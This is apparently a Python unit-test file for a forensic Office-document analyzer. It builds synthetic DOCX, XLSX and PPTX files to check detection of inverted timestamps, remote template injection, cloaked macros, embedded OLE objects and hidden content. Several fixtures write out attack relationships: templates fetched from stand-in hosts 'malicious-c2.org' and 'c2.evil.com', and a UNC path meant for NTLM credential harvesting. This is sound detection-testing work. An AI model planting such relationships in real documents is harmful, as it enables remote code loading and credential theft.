"""
PRAMAANX - Phase 2 Office Forensic Analyzer Unit Tests
======================================================
Tests metadata extraction, timestamp chronology, Remote Template Injection (CVE-2017-0199),
cloaked VBA macros, embedded OLE packages, hidden worksheets/slides, and legacy OLE files.
"""

import io
from pathlib import Path
import zipfile
import pytest

from backend.analyzers.office import analyze_office
from backend.pipeline import ForensicPipeline


# ==============================================================================
# 1. Benign OpenXML Metadata Extraction
# ==============================================================================

def test_analyze_benign_docx(tmp_path: Path):
    """Creates a benign DOCX archive and verifies metadata and timeline parsing."""
    docx_path = tmp_path / "report.docx"
    core_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
        'xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/">'
        '<dc:creator>Alice Engineer</dc:creator>'
        '<cp:lastModifiedBy>Bob Reviewer</cp:lastModifiedBy>'
        '<dcterms:created xsi:type="dcterms:W3CDTF" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">2024-03-01T09:00:00Z</dcterms:created>'
        '<dcterms:modified xsi:type="dcterms:W3CDTF" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">2024-03-01T11:30:00Z</dcterms:modified>'
        '<cp:revision>3</cp:revision>'
        '</cp:coreProperties>'
    )
    app_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">'
        '<Application>Microsoft Office Word</Application>'
        '<TotalTime>150</TotalTime>'
        '<Words>1200</Words>'
        '</Properties>'
    )

    with zipfile.ZipFile(docx_path, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("word/document.xml", "<w:document></w:document>")
        zf.writestr("docProps/core.xml", core_xml)
        zf.writestr("docProps/app.xml", app_xml)

    report = analyze_office(docx_path)
    assert report.format_type == "docx"
    assert report.metadata["creator"] == "Alice Engineer"
    assert report.metadata["last_modified_by"] == "Bob Reviewer"
    assert report.metadata["words"] == 1200
    assert report.metadata["total_edit_time_minutes"] == 150
    assert len(report.timeline) == 2
    assert report.has_macros is False
    assert report.has_embedded_objects is False


# ==============================================================================
# 2. Inverted Office Metadata Timestamps
# ==============================================================================

def test_analyze_inverted_timestamps_office(tmp_path: Path):
    """Detects when Office modified date is prior to created date."""
    docx_path = tmp_path / "tampered_dates.docx"
    core_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
        'xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/">'
        '<dc:creator>Adversary</dc:creator>'
        '<dcterms:created>2025-01-01T10:00:00Z</dcterms:created>'
        '<dcterms:modified>2022-01-01T10:00:00Z</dcterms:modified>'  # 3 years prior!
        '</cp:coreProperties>'
    )
    with zipfile.ZipFile(docx_path, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("word/document.xml", "<w:document></w:document>")
        zf.writestr("docProps/core.xml", core_xml)

    report = analyze_office(docx_path)
    assert any("Inverted Modification Timestamp" in f.title for f in report.findings)


# ==============================================================================
# 3. Remote Template Injection (CVE-2017-0199)
# ==============================================================================

def test_analyze_remote_template_injection(tmp_path: Path):
    """Detects attachedTemplate relationship pointing to remote HTTP URL."""
    docx_path = tmp_path / "template_inject.docx"
    rels_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        'Target="https://malicious-c2.org/templates/payload.dotm" '
        'TargetMode="External"/>'
        '</Relationships>'
    )
    with zipfile.ZipFile(docx_path, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("word/document.xml", "<w:document></w:document>")
        zf.writestr("word/_rels/document.xml.rels", rels_xml)

    report = analyze_office(docx_path)
    assert any("Remote Template Injection Detected" in f.title for f in report.findings)
    inject_finding = next(f for f in report.findings if "Remote Template Injection" in f.title)
    assert inject_finding.severity == "high"
    assert inject_finding.weight >= 0.95


# ==============================================================================
# 4. Suspicious UNC Path in Relationships
# ==============================================================================

def test_analyze_suspicious_unc_path(tmp_path: Path):
    """Detects UNC network path (\\\\attacker\\share) used for NTLM credential harvesting."""
    docx_path = tmp_path / "unc_harvest.docx"
    rels_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
        'Target="\\\\198.51.100.10\\leak\\icon.png" '
        'TargetMode="External"/>'
        '</Relationships>'
    )
    with zipfile.ZipFile(docx_path, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("word/document.xml", "<w:document></w:document>")
        zf.writestr("word/_rels/document.xml.rels", rels_xml)

    report = analyze_office(docx_path)
    assert any("Suspicious External Relationship Target" in f.title for f in report.findings)


# ==============================================================================
# 5. Cloaked VBA Macro in Standard DOCX
# ==============================================================================

def test_analyze_cloaked_macro_docx(tmp_path: Path):
    """Detects vbaProject.bin disguised inside a standard .docx extension."""
    docx_path = tmp_path / "invoice.docx"
    with zipfile.ZipFile(docx_path, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("word/document.xml", "<w:document></w:document>")
        zf.writestr("word/vbaProject.bin", b"\xD0\xCF\x11\xE0 dummy vba project binary")

    report = analyze_office(docx_path)
    assert report.has_macros is True
    assert any("Cloaked VBA Macro in Standard Extension" in f.title for f in report.findings)
    cloaked_finding = next(f for f in report.findings if "Cloaked VBA Macro" in f.title)
    assert cloaked_finding.severity == "high"
    assert cloaked_finding.weight >= 0.95


# ==============================================================================
# 6. Embedded OLE Objects & Binary Packages
# ==============================================================================

def test_analyze_embedded_ole_objects(tmp_path: Path):
    """Detects embedded OLE packages inside word/embeddings/."""
    docx_path = tmp_path / "embedded_ole.docx"
    with zipfile.ZipFile(docx_path, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("word/document.xml", "<w:document></w:document>")
        zf.writestr("word/embeddings/oleObject1.bin", b"\xD0\xCF\x11\xE0 binary stream")

    report = analyze_office(docx_path)
    assert report.has_embedded_objects is True
    assert "oleObject1.bin" in report.embedded_objects_list
    assert any("Embedded OLE Package / Binary Object Detected" in f.title for f in report.findings)


# ==============================================================================
# 7. Hidden Content: VeryHidden Worksheet in Excel
# ==============================================================================

def test_analyze_very_hidden_sheet_xlsx(tmp_path: Path):
    """Detects state='veryHidden' worksheet in Excel workbook.xml."""
    xlsx_path = tmp_path / "financials.xlsx"
    workbook_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
        '<sheets>'
        '<sheet name="Q1_Sales" sheetId="1" r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>'
        '<sheet name="HiddenPayload" sheetId="2" state="veryHidden" r:id="rId2" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>'
        '</sheets>'
        '</workbook>'
    )
    with zipfile.ZipFile(xlsx_path, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("xl/workbook.xml", workbook_xml)

    report = analyze_office(xlsx_path)
    assert report.has_hidden_content is True
    assert any("VeryHidden Worksheet Detected" in f.title for f in report.findings)


# ==============================================================================
# 8. Hidden Slides in PowerPoint
# ==============================================================================

def test_analyze_hidden_slide_pptx(tmp_path: Path):
    """Detects show='0' hidden slide in PowerPoint presentation.xml."""
    pptx_path = tmp_path / "presentation.pptx"
    pres_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">'
        '<p:sldIdLst>'
        '<p:sldId id="256" r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>'
        '<p:sldId id="257" r:id="rId2" show="0" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>'
        '</p:sldIdLst>'
        '</p:presentation>'
    )
    with zipfile.ZipFile(pptx_path, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("ppt/presentation.xml", pres_xml)

    report = analyze_office(pptx_path)
    assert report.has_hidden_content is True
    assert any("Hidden Slide(s) Detected" in f.title for f in report.findings)


# ==============================================================================
# 9. Vanished / Hidden Text in Word
# ==============================================================================

def test_analyze_vanished_text_docx(tmp_path: Path):
    """Detects <w:vanish/> formatted text in word/document.xml."""
    docx_path = tmp_path / "vanish.docx"
    doc_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:body>'
        '<w:p><w:r><w:t>Visible paragraph</w:t></w:r></w:p>'
        '<w:p><w:r><w:rPr><w:vanish/></w:rPr><w:t>Concealed contract clause</w:t></w:r></w:p>'
        '</w:body>'
        '</w:document>'
    )
    with zipfile.ZipFile(docx_path, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("word/document.xml", doc_xml)

    report = analyze_office(docx_path)
    assert report.has_hidden_content is True
    assert any("Hidden / Vanished Text Formatting" in f.title for f in report.findings)


# ==============================================================================
# 10. Pipeline Integration
# ==============================================================================

def test_pipeline_integration_office_exploit(tmp_path: Path):
    """Tests complete pipeline evaluation of a DOCX containing remote template injection."""
    docx_path = tmp_path / "exploit_sample.docx"
    rels_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        'Target="http://c2.evil.com/template.dotm" '
        'TargetMode="External"/>'
        '</Relationships>'
    )
    with zipfile.ZipFile(docx_path, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("word/document.xml", "<w:document></w:document>")
        zf.writestr("word/_rels/document.xml.rels", rels_xml)

    pipeline = ForensicPipeline()
    result = pipeline.analyze_file(docx_path, "exploit_sample.docx")

    assert result.detected_mime == "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    assert result.risk_score >= 80
    assert result.risk_band == "High"
    assert any("Remote Template Injection" in f.title for f in result.findings)


def test_office_findings_container_paths_and_categories(tmp_path: Path):
    """Verify that Office findings contain exact container paths and categories."""
    docx_path = tmp_path / "trace_sample.docx"
    rels_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        'Target="http://c2.evil.com/template.dotm" '
        'TargetMode="External"/>'
        '</Relationships>'
    )
    with zipfile.ZipFile(docx_path, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("word/document.xml", "<w:document></w:document>")
        zf.writestr("word/_rels/settings.xml.rels", rels_xml)
        zf.writestr("word/embeddings/payload.bin", b"\x90\x90\x90")

    report = analyze_office(docx_path)
    rel_findings = [f for f in report.findings if "Remote Template" in f.title]
    assert len(rel_findings) == 1
    rf = rel_findings[0]
    assert rf.category == "heuristic"
    assert rf.evidence.get("container_path") == "word/_rels/settings.xml.rels"
    assert rf.evidence.get("remote_template_url") == "http://c2.evil.com/template.dotm"

    emb_findings = [f for f in report.findings if "Embedded OLE" in f.title]
    assert len(emb_findings) == 1
    ef = emb_findings[0]
    assert ef.category == "structural"
    assert "embeddings/payload.bin" in ef.evidence.get("container_path", "")


